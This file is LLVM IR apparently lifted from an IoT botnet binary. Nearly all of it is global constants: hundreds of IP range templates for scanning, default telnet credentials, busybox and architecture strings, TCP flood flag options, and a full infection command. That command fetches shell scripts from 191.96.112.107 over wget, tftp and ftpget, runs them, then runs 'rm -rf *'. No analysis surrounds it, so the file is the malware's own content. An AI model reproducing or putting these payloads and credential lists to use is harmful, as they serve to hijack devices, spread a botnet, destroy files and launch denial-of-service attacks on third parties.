source_filename = "test"
target datalayout = "E-p:32:32:32-f80:32:32"

%0 = type { i1, i1, i1, i1, i4, i4, i4, i4, i4, i4, i4 }
%1 = type { i1, i1, i1, i1, i4, i4, i4, i4, i4, i4, i4 }
%2 = type { i1, i1, i1, i1 }

@r1 = internal unnamed_addr global i32 0
@r3 = internal unnamed_addr global i32 0
@r4 = internal unnamed_addr global i32 0
@r5 = internal unnamed_addr global i32 0
@r6 = internal unnamed_addr global i32 0
@r7 = internal unnamed_addr global i32 0
@r8 = internal unnamed_addr global i32 0
@r9 = internal unnamed_addr global i32 0
@r10 = internal unnamed_addr global i32 0
@r11 = internal unnamed_addr global i32 0
@r19 = internal unnamed_addr global i32 0
@r20 = internal unnamed_addr global i32 0
@r21 = internal unnamed_addr global i32 0
@r22 = internal unnamed_addr global i32 0
@r23 = internal unnamed_addr global i32 0
@r24 = internal unnamed_addr global i32 0
@r25 = internal unnamed_addr global i32 0
@r26 = internal unnamed_addr global i32 0
@r27 = internal unnamed_addr global i32 0
@r28 = internal unnamed_addr global i32 0
@r29 = internal unnamed_addr global i32 0
@r30 = internal unnamed_addr global i32 0
@r31 = internal unnamed_addr global i32 0
@cr0_so = internal unnamed_addr global i1 false
@cr4 = internal unnamed_addr global i4 0
@lr = internal unnamed_addr global i32 0
@0 = external global i32
@global_var_1002800c.2 = global i32 0
@global_var_1002801c.3 = local_unnamed_addr global i32* @global_var_1002800c.2
@global_var_10028638.6 = global i32 0
@global_var_10028010.7 = global i32 0
@global_var_10028650.8 = global i32 0
@global_var_10028654.9 = local_unnamed_addr global i32 0
@global_var_10028658.10 = local_unnamed_addr global i32 0
@global_var_1002823c.11 = local_unnamed_addr global i32 4095
@global_var_10028238.12 = local_unnamed_addr global i32 362436
@global_var_10014ca4.13 = constant [7 x i8] c"(null)\00"
@global_var_100285d0.14 = local_unnamed_addr global i32 0
@global_var_100013c0.15 = constant i32 1208003701
@global_var_1000140c.16 = constant i32 939589631
@global_var_10001460.17 = constant i32 1207959608
@global_var_10014cac.18 = constant [8 x i8] c"/bin/sh\00"
@global_var_100148f0.19 = constant [3 x i8] c"sh\00"
@global_var_10014cb4.20 = constant [3 x i8] c"-c\00"
@global_var_100014c0.21 = constant [3 x i8] c"8`\00"
@global_var_100014f0.22 = constant i32 1207959576
@global_var_10014cb8.23 = constant i32 -1
@global_var_100150b8.24 = constant [14 x i8] c"/proc/cpuinfo\00"
@global_var_100150c8.25 = constant [9 x i8] c"BOGOMIPS\00"
@global_var_10001ce8.26 = constant i32 939524096
@global_var_10001d34.27 = constant i32 939524097
@global_var_10001f28.28 = constant i32 939524126
@global_var_100285b0.29 = local_unnamed_addr global i32 0
@global_var_100150d4.30 = constant [5 x i8] c"PING\00"
@global_var_10002024.31 = constant i32 939524126
@global_var_10014c94.32 = constant [8 x i8] c"busybox\00"
@global_var_10014c9c.33 = constant i32 603979776
@global_var_10014ca0.34 = constant i32 587202560
@global_var_100281fc.35 = global [3 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_10014c94.32, i32 0, i32 0), i8* bitcast (i32* @global_var_10014c9c.33 to i8*), i8* bitcast (i32* @global_var_10014ca0.34 to i8*)]
@global_var_10014c5c.36 = constant [7 x i8] c"nvalid\00"
@global_var_10014c64.37 = constant [6 x i8] c"ailed\00"
@global_var_10014c6c.38 = constant [9 x i8] c"ncorrect\00"
@global_var_10014c78.39 = constant [6 x i8] c"enied\00"
@global_var_10014c80.40 = constant [5 x i8] c"rror\00"
@global_var_10014c88.41 = constant [7 x i8] c"oodbye\00"
@global_var_10014c90.42 = constant [4 x i8] c"bad\00"
@global_var_100281dc.43 = global [7 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10014c5c.36, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10014c64.37, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_10014c6c.38, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10014c78.39, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10014c80.40, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10014c88.41, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10014c90.42, i32 0, i32 0)]
@global_var_100027a0.44 = constant i32 939524098
@global_var_100029a8.45 = constant i32 939524097
@global_var_100285b8.46 = global i32 0
@global_var_100285bc.47 = local_unnamed_addr global i32 0
@global_var_100285e4.48 = local_unnamed_addr global i32 0
@global_var_10002d20.49 = constant i32 939524096
@global_var_100150dc.50 = constant [6 x i8] c":>%$#\00"
@global_var_100285c8.51 = global i32 0
@global_var_100285c9.52 = local_unnamed_addr global i32 0
@global_var_100285ca.53 = local_unnamed_addr global i32 0
@global_var_100150e4.56 = constant [12 x i8] c"177.5.%d.%d\00"
@global_var_100150f0.57 = constant [15 x i8] c"1103.165.%d.%d\00"
@global_var_10015100.58 = constant [12 x i8] c"185.3.%d.%d\00"
@global_var_1001510c.59 = constant [13 x i8] c"37.158.%d.%d\00"
@global_var_1001511c.60 = constant [11 x i8] c"95.9.%d.%d\00"
@global_var_10015128.61 = constant [14 x i8] c"122.252.%d.%d\00"
@global_var_10015138.62 = constant [12 x i8] c"58.71.%d.%d\00"
@global_var_10015144.63 = constant [13 x i8] c"104.55.%d.%d\00"
@global_var_10015154.64 = constant [14 x i8] c"103.186.%d.%d\00"
@global_var_10015164.65 = constant [14 x i8] c"103.189.%d.%d\00"
@global_var_10015174.66 = constant [14 x i8] c"221.120.%d.%d\00"
@global_var_10015184.67 = constant [11 x i8] c"88.5.%d.%d\00"
@global_var_10015190.68 = constant [14 x i8] c"122.254.%d.%d\00"
@global_var_100151a0.69 = constant [13 x i8] c"108.20.%d.%d\00"
@global_var_100151b0.70 = constant [13 x i8] c"108.47.%d.%d\00"
@global_var_100151c0.71 = constant [13 x i8] c"108.57.%d.%d\00"
@global_var_100151d0.72 = constant [14 x i8] c"45.1103.%d.%d\00"
@global_var_100151e0.73 = constant [13 x i8] c"101.51.%d.%d\00"
@global_var_100151f0.74 = constant [13 x i8] c"137.59.%d.%d\00"
@global_var_10015200.75 = constant [11 x i8] c"1.56.%d.%d\00"
@global_var_1001520c.76 = constant [12 x i8] c"1.188.%d.%d\00"
@global_var_10015218.77 = constant [14 x i8] c"122.204.%d.%d\00"
@global_var_10015228.78 = constant [12 x i8] c"177.0.%d.%d\00"
@global_var_10015234.79 = constant [12 x i8] c"177.8.%d.%d\00"
@global_var_10015240.80 = constant [13 x i8] c"177.91.%d.%d\00"
@global_var_10015250.81 = constant [13 x i8] c"177.54.%d.%d\00"
@global_var_10015260.82 = constant [13 x i8] c"177.98.%d.%d\00"
@global_var_10015270.83 = constant [14 x i8] c"177.177.%d.%d\00"
@global_var_10015280.84 = constant [14 x i8] c"177.192.%d.%d\00"
@global_var_10015290.85 = constant [12 x i8] c"36.32.%d.%d\00"
@global_var_1001529c.86 = constant [13 x i8] c"36.248.%d.%d\00"
@global_var_100152ac.87 = constant [12 x i8] c"39.64.%d.%d\00"
@global_var_100152b8.88 = constant [11 x i8] c"42.4.%d.%d\00"
@global_var_100152c4.89 = constant [12 x i8] c"42.48.%d.%d\00"
@global_var_100152d0.90 = constant [12 x i8] c"42.52.%d.%d\00"
@global_var_100152dc.91 = constant [12 x i8] c"42.56.%d.%d\00"
@global_var_100152e8.92 = constant [12 x i8] c"42.63.%d.%d\00"
@global_var_100152f4.93 = constant [12 x i8] c"42.84.%d.%d\00"
@global_var_10015300.94 = constant [13 x i8] c"42.176.%d.%d\00"
@global_var_10015310.95 = constant [13 x i8] c"42.224.%d.%d\00"
@global_var_10015320.96 = constant [13 x i8] c"43.253.%d.%d\00"
@global_var_10015330.97 = constant [13 x i8] c"43.230.%d.%d\00"
@global_var_10015340.98 = constant [13 x i8] c"163.53.%d.%d\00"
@global_var_10015350.99 = constant [13 x i8] c"62.252.%d.%d\00"
@global_var_10015360.100 = constant [13 x i8] c"43.245.%d.%d\00"
@global_var_10015370.101 = constant [13 x i8] c"62.255.%d.%d\00"
@global_var_10015380.102 = constant [13 x i8] c"123.25.%d.%d\00"
@global_var_10015390.103 = constant [13 x i8] c"108.54.%d.%d\00"
@global_var_100153a0.104 = constant [14 x i8] c"177.255.%d.%d\00"
@global_var_100153b0.105 = constant [14 x i8] c"108.204.%d.%d\00"
@global_var_100153c0.106 = constant [13 x i8] c"123.24.%d.%d\00"
@global_var_100153d0.107 = constant [14 x i8] c"104.191.%d.%d\00"
@global_var_100153e0.108 = constant [15 x i8] c"1103.100.%d.%d\00"
@global_var_100153f0.109 = constant [14 x i8] c"104.188.%d.%d\00"
@global_var_10015400.110 = constant [14 x i8] c"104.189.%d.%d\00"
@global_var_10015410.111 = constant [13 x i8] c"94.174.%d.%d\00"
@global_var_10015420.112 = constant [14 x i8] c"122.160.%d.%d\00"
@global_var_10015430.113 = constant [14 x i8] c"122.161.%d.%d\00"
@global_var_10015440.114 = constant [14 x i8] c"122.162.%d.%d\00"
@global_var_10015450.115 = constant [14 x i8] c"122.163.%d.%d\00"
@global_var_10015460.116 = constant [14 x i8] c"122.164.%d.%d\00"
@global_var_10015470.117 = constant [14 x i8] c"122.165.%d.%d\00"
@global_var_10015480.118 = constant [14 x i8] c"122.166.%d.%d\00"
@global_var_10015490.119 = constant [14 x i8] c"122.167.%d.%d\00"
@global_var_100154a0.120 = constant [14 x i8] c"122.168.%d.%d\00"
@global_var_100154b0.121 = constant [14 x i8] c"122.169.%d.%d\00"
@global_var_100154c0.122 = constant [14 x i8] c"122.170.%d.%d\00"
@global_var_100154d0.123 = constant [14 x i8] c"122.171.%d.%d\00"
@global_var_100154e0.124 = constant [14 x i8] c"122.172.%d.%d\00"
@global_var_100154f0.125 = constant [14 x i8] c"122.173.%d.%d\00"
@global_var_10015500.126 = constant [14 x i8] c"122.174.%d.%d\00"
@global_var_10015510.127 = constant [14 x i8] c"122.177.%d.%d\00"
@global_var_10015520.128 = constant [14 x i8] c"122.176.%d.%d\00"
@global_var_10015530.129 = constant [15 x i8] c"122.1103.%d.%d\00"
@global_var_10015540.130 = constant [14 x i8] c"122.179.%d.%d\00"
@global_var_10015550.131 = constant [14 x i8] c"122.180.%d.%d\00"
@global_var_10015560.132 = constant [16 x i8] c"122.11103.%d.%d\00"
@global_var_10015570.133 = constant [14 x i8] c"122.182.%d.%d\00"
@global_var_10015580.134 = constant [14 x i8] c"122.183.%d.%d\00"
@global_var_10015590.135 = constant [14 x i8] c"122.184.%d.%d\00"
@global_var_100155a0.136 = constant [15 x i8] c"122.1185.%d.%d\00"
@global_var_100155b0.137 = constant [14 x i8] c"122.186.%d.%d\00"
@global_var_100155c0.138 = constant [14 x i8] c"122.187.%d.%d\00"
@global_var_100155d0.139 = constant [14 x i8] c"122.188.%d.%d\00"
@global_var_100155e0.140 = constant [14 x i8] c"122.189.%d.%d\00"
@global_var_100155f0.141 = constant [14 x i8] c"122.190.%d.%d\00"
@global_var_10015600.142 = constant [14 x i8] c"122.191.%d.%d\00"
@global_var_10015610.143 = constant [13 x i8] c"45.121.%d.%d\00"
@global_var_10015620.144 = constant [13 x i8] c"45.120.%d.%d\00"
@global_var_10015630.145 = constant [13 x i8] c"45.115.%d.%d\00"
@global_var_10015640.146 = constant [13 x i8] c"43.252.%d.%d\00"
@global_var_10015650.147 = constant [13 x i8] c"43.240.%d.%d\00"
@global_var_10015660.148 = constant [13 x i8] c"49.118.%d.%d\00"
@global_var_10015670.149 = constant [14 x i8] c"103.188.%d.%d\00"
@global_var_10015680.150 = constant [14 x i8] c"45.1177.%d.%d\00"
@global_var_10015690.151 = constant [13 x i8] c"108.30.%d.%d\00"
@global_var_100156a0.152 = constant [13 x i8] c"122.33.%d.%d\00"
@global_var_100156b0.153 = constant [13 x i8] c"123.16.%d.%d\00"
@global_var_100156c0.154 = constant [13 x i8] c"202.44.%d.%d\00"
@global_var_100156d0.155 = constant [13 x i8] c"116.93.%d.%d\00"
@global_var_100156e0.156 = constant [12 x i8] c"91.83.%d.%d\00"
@global_var_100156ec.157 = constant [14 x i8] c"122.253.%d.%d\00"
@global_var_100156fc.158 = constant [15 x i8] c"1103.173.%d.%d\00"
@global_var_1001570c.159 = constant [14 x i8] c"104.190.%d.%d\00"
@global_var_1001571c.160 = constant [13 x i8] c"146.88.%d.%d\00"
@global_var_1001572c.161 = constant [14 x i8] c"177.196.%d.%d\00"
@global_var_1001573c.162 = constant [15 x i8] c"104.1103.%d.%d\00"
@global_var_1001574c.163 = constant [13 x i8] c"177.45.%d.%d\00"
@global_var_1001575c.164 = constant [14 x i8] c"183.223.%d.%d\00"
@global_var_1001576c.165 = constant [13 x i8] c"116.71.%d.%d\00"
@global_var_1001577c.166 = constant [13 x i8] c"108.44.%d.%d\00"
@global_var_1001578c.167 = constant [14 x i8] c"110.235.%d.%d\00"
@global_var_1001579c.168 = constant [14 x i8] c"124.253.%d.%d\00"
@global_var_100157ac.169 = constant [14 x i8] c"211.237.%d.%d\00"
@global_var_100157bc.170 = constant [15 x i8] c"1103.177.%d.%d\00"
@global_var_100157cc.171 = constant [14 x i8] c"1103.93.%d.%d\00"
@global_var_100157dc.172 = constant [12 x i8] c"111.9.%d.%d\00"
@global_var_100157e8.173 = constant [14 x i8] c"222.252.%d.%d\00"
@global_var_100157f8.174 = constant [14 x i8] c"104.174.%d.%d\00"
@global_var_10015808.175 = constant [14 x i8] c"104.160.%d.%d\00"
@global_var_10015818.176 = constant [14 x i8] c"104.161.%d.%d\00"
@global_var_10015828.177 = constant [14 x i8] c"104.162.%d.%d\00"
@global_var_10015838.178 = constant [14 x i8] c"104.163.%d.%d\00"
@global_var_10015848.179 = constant [14 x i8] c"104.164.%d.%d\00"
@global_var_10015858.180 = constant [14 x i8] c"104.165.%d.%d\00"
@global_var_10015868.181 = constant [14 x i8] c"104.166.%d.%d\00"
@global_var_10015878.182 = constant [14 x i8] c"104.167.%d.%d\00"
@global_var_10015888.183 = constant [14 x i8] c"104.168.%d.%d\00"
@global_var_10015898.184 = constant [14 x i8] c"104.169.%d.%d\00"
@global_var_100158a8.185 = constant [13 x i8] c"123.17.%d.%d\00"
@global_var_100158b8.186 = constant [13 x i8] c"123.18.%d.%d\00"
@global_var_100158c8.187 = constant [13 x i8] c"123.19.%d.%d\00"
@global_var_100158d8.188 = constant [13 x i8] c"123.20.%d.%d\00"
@global_var_100158e8.189 = constant [13 x i8] c"123.21.%d.%d\00"
@global_var_100158f8.190 = constant [13 x i8] c"123.22.%d.%d\00"
@global_var_10015908.191 = constant [14 x i8] c"222.253.%d.%d\00"
@global_var_10015918.192 = constant [14 x i8] c"222.254.%d.%d\00"
@global_var_10015928.193 = constant [14 x i8] c"222.255.%d.%d\00"
@global_var_10015938.194 = constant [13 x i8] c"37.247.%d.%d\00"
@global_var_10015948.195 = constant [14 x i8] c"122.208.%d.%d\00"
@global_var_10015958.196 = constant [14 x i8] c"183.220.%d.%d\00"
@global_var_10015968.197 = constant [14 x i8] c"177.201.%d.%d\00"
@global_var_10015978.198 = constant [14 x i8] c"108.198.%d.%d\00"
@global_var_10015988.199 = constant [13 x i8] c"91.205.%d.%d\00"
@global_var_10015998.200 = constant [13 x i8] c"88.248.%d.%d\00"
@global_var_100159a8.201 = constant [13 x i8] c"88.105.%d.%d\00"
@global_var_100159b8.202 = constant [13 x i8] c"88.247.%d.%d\00"
@global_var_100159c8.203 = constant [14 x i8] c"185.105.%d.%d\00"
@global_var_100159d8.204 = constant [12 x i8] c"188.3.%d.%d\00"
@global_var_100159e4.205 = constant [14 x i8] c"108.203.%d.%d\00"
@global_var_100159f4.206 = constant [13 x i8] c"108.55.%d.%d\00"
@global_var_10015a04.207 = constant [14 x i8] c"108.220.%d.%d\00"
@global_var_10015a14.208 = constant [14 x i8] c"183.233.%d.%d\00"
@global_var_10015a24.209 = constant [14 x i8] c"108.242.%d.%d\00"
@global_var_10015a34.210 = constant [14 x i8] c"108.122.%d.%d\00"
@global_var_10015a44.211 = constant [14 x i8] c"108.195.%d.%d\00"
@global_var_10015a54.212 = constant [15 x i8] c"108.2122.%d.%d\00"
@global_var_10015a64.213 = constant [14 x i8] c"108.218.%d.%d\00"
@global_var_10015a74.214 = constant [14 x i8] c"108.225.%d.%d\00"
@global_var_10015a84.215 = constant [14 x i8] c"108.228.%d.%d\00"
@global_var_10015a94.216 = constant [14 x i8] c"108.231.%d.%d\00"
@global_var_10015aa4.217 = constant [13 x i8] c"108.60.%d.%d\00"
@global_var_10015ab4.218 = constant [14 x i8] c"108.248.%d.%d\00"
@global_var_10015ac4.219 = constant [14 x i8] c"108.253.%d.%d\00"
@global_var_10015ad4.220 = constant [14 x i8] c"108.255.%d.%d\00"
@global_var_10015ae4.221 = constant [13 x i8] c"108.35.%d.%d\00"
@global_var_10015af4.222 = constant [13 x i8] c"108.49.%d.%d\00"
@global_var_10015b04.223 = constant [13 x i8] c"108.62.%d.%d\00"
@global_var_10015b14.224 = constant [13 x i8] c"144.48.%d.%d\00"
@global_var_10015b24.225 = constant [13 x i8] c"163.47.%d.%d\00"
@global_var_10015b34.226 = constant [13 x i8] c"223.29.%d.%d\00"
@global_var_10015b44.227 = constant [13 x i8] c"59.153.%d.%d\00"
@global_var_10015b54.228 = constant [14 x i8] c"104.176.%d.%d\00"
@global_var_10015b64.229 = constant [14 x i8] c"104.177.%d.%d\00"
@global_var_10015b74.230 = constant [14 x i8] c"104.183.%d.%d\00"
@global_var_10015b84.231 = constant [14 x i8] c"202.164.%d.%d\00"
@global_var_10015b94.232 = constant [14 x i8] c"203.134.%d.%d\00"
@global_var_10015ba4.233 = constant [13 x i8] c"210.56.%d.%d\00"
@global_var_10015bb4.234 = constant [13 x i8] c"49.156.%d.%d\00"
@global_var_10015bc4.235 = constant [14 x i8] c"203.210.%d.%d\00"
@global_var_10015bd4.236 = constant [17 x i8] c"1103.11103.%d.%d\00"
@global_var_10015be8.237 = constant [16 x i8] c"1103.1103.%d.%d\00"
@global_var_10015bf8.238 = constant [15 x i8] c"1103.176.%d.%d\00"
@global_var_10015c08.239 = constant [15 x i8] c"1103.170.%d.%d\00"
@global_var_10015c18.240 = constant [15 x i8] c"1103.171.%d.%d\00"
@global_var_10015c28.241 = constant [15 x i8] c"1103.162.%d.%d\00"
@global_var_10015c38.242 = constant [13 x i8] c"177.26.%d.%d\00"
@global_var_10015c48.243 = constant [13 x i8] c"177.28.%d.%d\00"
@global_var_10015c58.244 = constant [13 x i8] c"177.29.%d.%d\00"
@global_var_10015c68.245 = constant [13 x i8] c"177.30.%d.%d\00"
@global_var_10015c78.246 = constant [13 x i8] c"177.31.%d.%d\00"
@global_var_10015c88.247 = constant [14 x i8] c"203.191.%d.%d\00"
@global_var_10015c98.248 = constant [13 x i8] c"91.233.%d.%d\00"
@global_var_100285d8.249 = local_unnamed_addr global i32 0
@global_var_10007c18.250 = constant i32 939524096
@global_var_10007dd8.251 = constant i32 939524098
@global_var_10007e94.252 = constant i32 939524096
@global_var_10014be0.253 = constant [15 x i8] c"/dev/netslink/\00"
@global_var_10014bf0.254 = constant [6 x i8] c"/tmp/\00"
@global_var_10014bf8.255 = constant [6 x i8] c"/var/\00"
@global_var_10014c00.256 = constant [6 x i8] c"/dev/\00"
@global_var_10014c08.257 = constant [10 x i8] c"/var/run/\00"
@global_var_10014c14.258 = constant [10 x i8] c"/dev/shm/\00"
@global_var_10014c20.259 = constant [6 x i8] c"/mnt/\00"
@global_var_10014c28.260 = constant [7 x i8] c"/boot/\00"
@global_var_10014c30.261 = constant [6 x i8] c"/usr/\00"
@global_var_10014c38.262 = constant [6 x i8] c"/opt/\00"
@global_var_1002819c.263 = global [10 x i8*] [i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_10014be0.253, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10014bf0.254, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10014bf8.255, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10014c00.256, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_10014c08.257, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_10014c14.258, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10014c20.259, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10014c28.260, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10014c30.261, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10014c38.262, i32 0, i32 0)]
@global_var_10015cd4.264 = constant i32 -56512
@global_var_10008320.265 = constant i32 1207962236
@global_var_10008340.266 = constant i32 1207962204
@global_var_10014bb8.278 = constant [5 x i8] c"root\00"
@global_var_10014bc0.279 = constant [6 x i8] c"admin\00"
@global_var_10014bc8.280 = constant [7 x i8] c"telnet\00"
@global_var_10014bd0.281 = constant [5 x i8] c"1111\00"
@global_var_10014bd8.282 = constant [5 x i8] c"1234\00"
@global_var_10014a1c.304 = constant [412 x i8] c"cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://191.96.112.107/rooty.sh; chmod 777 rooty.sh; sh rooty.sh; tftp 191.96.112.107 -c get ktftp1.sh; chmod 777 ktftp1.sh; sh ktftp1.sh; tftp -r ktftp2.sh -g 191.96.112.107; chmod 777 ktftp2.sh; sh ktftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 191.96.112.107 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf rooty.sh ktftp1.sh ktftp2.sh ftp1.sh; rm -rf *\0D\0A\00"
@global_var_10016648.305 = constant i32 33554944
@global_var_10016948.306 = constant i32 1
@global_var_10028310.309 = global i32 34603008
@global_var_10015cf4.312 = constant [6 x i8] c"arfgG\00"
@global_var_10015cfc.313 = constant [9 x i8] c"HBiug655\00"
@global_var_10015d08.314 = constant [13 x i8] c"KJYDFyljf754\00"
@global_var_10015d18.315 = constant [20 x i8] c"LIKUGilkut769458905\00"
@global_var_10015d2c.316 = constant [17 x i8] c"JHFDSkgfc5747694\00"
@global_var_10015d40.317 = constant [12 x i8] c"GJjyur67458\00"
@global_var_10015d4c.318 = constant [12 x i8] c"RYSDk747586\00"
@global_var_10015d58.319 = constant [12 x i8] c"HKJGi5r8675\00"
@global_var_10015d64.320 = constant [10 x i8] c"KHGK7985i\00"
@global_var_10015d70.321 = constant [11 x i8] c"yuituiILYF\00"
@global_var_10015d7c.322 = constant [14 x i8] c"GKJDghfcjkgd4\00"
@global_var_10015d8c.323 = constant [12 x i8] c"uygtfgtrevf\00"
@global_var_10015d98.324 = constant [13 x i8] c"tyeuhygbtfvg\00"
@global_var_10015da8.325 = constant [9 x i8] c"ewqdcftr\00"
@global_var_10015db4.326 = constant [16 x i8] c"trbazetghhnbrty\00"
@global_var_10015dc4.327 = constant [11 x i8] c"tbhrwsehbg\00"
@global_var_10015dd0.328 = constant [12 x i8] c"twehgbferhb\00"
@global_var_10015ddc.329 = constant [12 x i8] c"etrbhhgetrb\00"
@global_var_10015de8.330 = constant [14 x i8] c"edfverthbyrtb\00"
@global_var_10015df8.331 = constant [14 x i8] c"kmiujmnhnhfgn\00"
@global_var_10015e08.332 = constant [14 x i8] c"zcdbvgdfsbgfd\00"
@global_var_10015e18.333 = constant [10 x i8] c"gdfbtsdgb\00"
@global_var_10015e24.334 = constant [14 x i8] c"ghdugffytsdyt\00"
@global_var_10015e34.335 = constant [14 x i8] c"tgerthgwtrwry\00"
@global_var_10015e44.336 = constant [12 x i8] c"yteytietyue\00"
@global_var_10015e50.337 = constant [9 x i8] c"qsortEQS\00"
@global_var_10015e5c.338 = constant [16 x i8] c"8969876hjkghblk\00"
@global_var_10015e6c.339 = constant [4 x i8] c"std\00"
@global_var_10015e70.340 = constant [4 x i8] c"dts\00"
@global_var_10015e74.341 = constant [4 x i8] c"lsk\00"
@global_var_10015e78.342 = constant [4 x i8] c"kek\00"
@global_var_10015e7c.343 = constant [6 x i8] c"smack\00"
@global_var_10015e84.344 = constant [4 x i8] c"ily\00"
@global_var_10015e88.345 = constant [4 x i8] c"tyf\00"
@global_var_10015e8c.346 = constant [4 x i8] c"pos\00"
@global_var_10015e90.347 = constant [6 x i8] c"cunts\00"
@global_var_10015e98.348 = constant [36 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10015cf4.312, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_10015cfc.313, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_10015d08.314, i32 0, i32 0), i8* getelementptr inbounds ([20 x i8], [20 x i8]* @global_var_10015d18.315, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_10015d2c.316, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_10015d40.317, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_10015d4c.318, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_10015d58.319, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_10015d64.320, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_10015d70.321, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_10015d7c.322, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_10015d8c.323, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_10015d98.324, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_10015da8.325, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_10015db4.326, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_10015dc4.327, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_10015dd0.328, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_10015ddc.329, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_10015de8.330, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_10015df8.331, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_10015e08.332, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_10015e18.333, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_10015e24.334, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_10015e34.335, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_10015e44.336, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_10015e50.337, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_10015e5c.338, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10015e6c.339, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10015e70.340, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10015e74.341, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10015e78.342, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10015e7c.343, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10015e84.344, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10015e88.345, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10015e8c.346, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10015e90.347, i32 0, i32 0)]
@global_var_10008eac.349 = constant i32 1207988069
@global_var_10008f2c.350 = constant [3 x i8] c"8`\00"
@global_var_10008f54.351 = constant [3 x i8] c"8`\00"
@global_var_10008f5c.352 = constant i32 939524096
@global_var_10015f28.353 = constant [27 x i8] c"Failed opening raw socket.\00"
@global_var_10009078.354 = constant i32 1207960928
@global_var_100090cc.355 = constant [3 x i8] c"8`\00"
@global_var_10009198.356 = constant [3 x i8] c"9 \00"
@global_var_100091fc.357 = constant i32 1207960524
@global_var_10015f44.358 = constant [33 x i8] c"Failed setting raw headers mode.\00"
@global_var_1000924c.359 = constant i32 1207960444
@global_var_10009280.360 = constant i32 1207987089
@global_var_100095ac.361 = constant [3 x i8] c"9 \00"
@global_var_100096f4.362 = constant i32 1207960876
@global_var_10009744.363 = constant i32 1207960796
@global_var_10015f68.364 = constant [4 x i8] c"all\00"
@global_var_10015f6c.365 = constant i32 738197504
@global_var_10015f70.366 = constant [4 x i8] c"syn\00"
@global_var_10015f74.367 = constant [4 x i8] c"rst\00"
@global_var_10015f78.368 = constant [4 x i8] c"fin\00"
@global_var_10015f7c.369 = constant [4 x i8] c"ack\00"
@global_var_10015f80.370 = constant [4 x i8] c"psh\00"
@global_var_10015f84.371 = constant [18 x i8] c"Invalid flag \22%s\22\00"
@global_var_10009a14.372 = constant [3 x i8] c"8`\00"
@global_var_100147b0.376 = constant [5 x i8] c"mips\00"
@global_var_100147b8.377 = constant [7 x i8] c"mipsel\00"
@global_var_100147c0.378 = constant [4 x i8] c"sh4\00"
